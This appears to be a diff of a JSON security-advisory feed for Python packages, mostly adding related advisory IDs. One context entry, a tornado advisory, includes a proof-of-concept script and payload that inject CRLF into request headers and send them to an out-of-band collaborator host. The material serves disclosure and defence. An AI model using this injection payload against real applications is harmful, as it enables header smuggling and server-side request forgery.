@@ -163,7 +163,8 @@
           "CGA-rmvf-7794-q3gg",
           "CGA-v584-967x-qgpm",
           "CGA-v6qx-945c-jj8w",
-          "CGA-xpcj-g2x8-wcc9"
+          "CGA-xpcj-g2x8-wcc9",
+          "CGA-xw8q-xp4x-825w"
         ],
         "summary": "Internationalized Domain Names in Applications (IDNA) vulnerable to denial of service from specially crafted inputs to idna.encode",
         "details": "### Impact\nA specially crafted argument to the `idna.encode()` function could consume significant resources. This may lead to a denial-of-service.\n\n### Patches\nThe function has been refined to reject such strings without the associated resource consumption in version 3.7.\n\n### Workarounds\nDomain names cannot exceed 253 characters in length, if this length limit is enforced prior to passing the domain to the `idna.encode()` function it should no longer consume significant resources. This is triggered by arbitrarily large inputs that would not occur in normal usage, but may be passed to the library assuming there is no preliminary input validation by the higher-level application.\n\n### References\n* https://huntr.com/bounties/93d78d07-d791-4b39-a845-cbfabc44aadb",
@@ -409,10 +410,12 @@
           "CGA-74xp-46xv-7q3v",
           "CGA-77h5-pgh2-r2fg",
           "CGA-8mx8-8v5r-99xg",
+          "CGA-fff7-969w-wcq5",
           "CGA-hf9v-fwg4-2jvw",
           "CGA-hhrg-5mf5-r2p5",
           "CGA-jcgc-jpw2-xpqq",
           "CGA-p79x-5pxg-f77m",
+          "CGA-phrh-j36c-pqjq",
           "CGA-rrq3-6489-25cv",
           "CGA-v263-vf6g-w8hh",
           "CGA-v542-whj6-7mj4",
@@ -679,9 +682,16 @@
           "CVE-2024-6345"
         ],
         "related": [
+          "CGA-374g-f8mr-whvm",
           "CGA-4mw5-xqpj-q4mq",
           "CGA-c5cf-23gj-ccmf",
-          "CGA-c79m-39cv-2j6g"
+          "CGA-c79m-39cv-2j6g",
+          "CGA-f2p4-hwhx-72xc",
+          "CGA-h655-78w4-797j",
+          "CGA-qmjx-gwcv-4p8x",
+          "CGA-rjmx-vqfq-f7rh",
+          "CGA-x22r-fp37-7vh6",
+          "CGA-xrq9-4hfh-g5jh"
         ],
         "summary": "setuptools vulnerable to Command Injection via package URL",
         "details": "A vulnerability in the `package_index` module of pypa/setuptools versions up to 69.1.1 allows for remote code execution via its download functions. These functions, which are used to download packages from URLs provided by users or retrieved from package index servers, are susceptible to code injection. If these functions are exposed to user-controlled inputs, such as package URLs, they can execute arbitrary commands on the system. The issue is fixed in version 70.0.",
@@ -1345,6 +1355,7 @@
         "related": [
           "CGA-2mj6-w546-q9r6",
           "CGA-72gj-8qx6-gcj4",
+          "CGA-gfgp-4jrg-x8xh",
           "CGA-wq3q-35vc-xj9h"
         ],
         "summary": "Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling') in tornado",
@@ -1487,7 +1498,8 @@
         "related": [
           "CGA-3mg6-hjmp-vwjr",
           "CGA-cj87-mmpg-46c2",
-          "CGA-fgf6-jq66-8gmr"
+          "CGA-fgf6-jq66-8gmr",
+          "CGA-jf2f-4wch-4c93"
         ],
         "summary": "Tornado has a CRLF injection in CurlAsyncHTTPClient headers",
         "details": "### Summary\nTornado\u2019s `curl_httpclient.CurlAsyncHTTPClient` class is vulnerable to CRLF (carriage return/line feed) injection in the request headers.\n\n### Details\nWhen an HTTP request is sent using `CurlAsyncHTTPClient`, Tornado does not reject carriage return (\\r) or line feed (\\n) characters in the request headers. As a result, if an application includes an attacker-controlled header value in a request sent using `CurlAsyncHTTPClient`, the attacker can inject arbitrary headers into the request or cause the application to send arbitrary requests to the specified server.\n\nThis behavior differs from that of the standard `AsyncHTTPClient` class, which does reject CRLF characters.\n\nThis issue appears to stem from libcurl's (as well as pycurl's) lack of validation for the [`HTTPHEADER`](https://curl.se/libcurl/c/CURLOPT_HTTPHEADER.html) option. libcurl\u2019s documentation states:\n\n> The headers included in the linked list must not be CRLF-terminated, because libcurl adds CRLF after each header item itself. Failure to comply with this might result in strange behavior. libcurl passes on the verbatim strings you give it, without any filter or other safe guards. That includes white space and control characters.\n\npycurl similarly appears to assume that the headers adhere to the correct format. Therefore, without any validation on Tornado\u2019s part, header names and values are included verbatim in the request sent by `CurlAsyncHTTPClient`, including any control characters that have special meaning in HTTP semantics.\n\n### PoC\nThe issue can be reproduced using the following script:\n\n```python\nimport asyncio\n\nfrom tornado import httpclient\nfrom tornado import curl_httpclient\n\nasync def main():\n    http_client = curl_httpclient.CurlAsyncHTTPClient()\n\n    request = httpclient.HTTPRequest(\n        # Burp Collaborator payload\n        \"http://727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com/\",\n        method=\"POST\",\n        body=\"body\",\n        # Injected header using CRLF characters\n        headers={\"Foo\": \"Bar\\r\\nHeader: Injected\"}\n    )\n\n    response = await http_client.fetch(request)\n    print(response.body)\n\n    http_client.close()\n\nif __name__ == \"__main__\":\n    asyncio.run(main())\n```\n\nWhen the specified server receives the request, it contains the injected header (`Header: Injected`) on its own line:\n\n```http\nPOST / HTTP/1.1\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com\nUser-Agent: Mozilla/5.0 (compatible; pycurl)\nAccept: */*\nAccept-Encoding: gzip,deflate\nFoo: Bar\nHeader: Injected\nContent-Length: 4\nContent-Type: application/x-www-form-urlencoded\n\nbody\n```\n\nThe attacker can also construct entirely new requests using a payload with multiple CRLF sequences. For example, specifying a header value of `\\r\\n\\r\\nPOST /attacker-controlled-url HTTP/1.1\\r\\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com` results in the server receiving an additional, attacker-controlled request:\n\n```http\nPOST /attacker-controlled-url HTTP/1.1\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com\nContent-Length: 4\nContent-Type: application/x-www-form-urlencoded\n\nbody\n```\n\n### Impact\nApplications using the Tornado library to send HTTP requests with untrusted header data are affected. This issue may facilitate the exploitation of server-side request forgery (SSRF) vulnerabilities.",
@@ -1668,9 +1680,11 @@
           "CGA-3ggr-w55x-hf5j",
           "CGA-5v3j-934q-gj4m",
           "CGA-64rf-gm8h-pg8g",
+          "CGA-688x-4mm6-g5vm",
           "CGA-69g4-mv22-46cq",
           "CGA-8f64-fgpv-jxj2",
           "CGA-8hq8-2689-rc8h",
+          "CGA-cx62-9vw2-mmpq",
           "CGA-grjq-jh3q-2p7g",
           "CGA-gwpm-7fhq-3wh2",
           "CGA-h28r-8q2c-xq96",
@@ -1680,6 +1694,7 @@
           "CGA-mrr8-97mj-749q",
           "CGA-rqhm-766h-p289",
           "CGA-vgvj-86h2-mvw3",
+          "CGA-vwcx-7fqm-jggq",
           "CGA-w3h9-h7jv-6q22"
         ],
         "summary": "urllib3's Proxy-Authorization request header isn't stripped during cross-origin redirects ",
